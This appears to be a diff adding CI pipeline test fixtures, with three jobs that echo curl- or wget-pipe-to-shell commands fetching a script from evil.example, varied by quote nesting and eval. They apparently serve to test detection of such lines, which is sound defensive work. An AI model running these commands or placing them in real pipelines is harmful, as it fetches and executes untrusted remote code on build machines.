@@ -1,0 +1,14 @@
+single_inside_double:
+  image: alpine:3.19
+  script:
+    - bash -c "echo 'install with: curl https://evil.example/i.sh | bash'"
+
+double_inside_single:
+  image: alpine:3.19
+  script:
+    - sh -c 'echo "curl https://evil.example/i.sh | sh"'
+
+eval_literal:
+  image: alpine:3.19
+  script:
+    - eval "echo 'wget -qO- https://evil.example/i.sh | sh'"
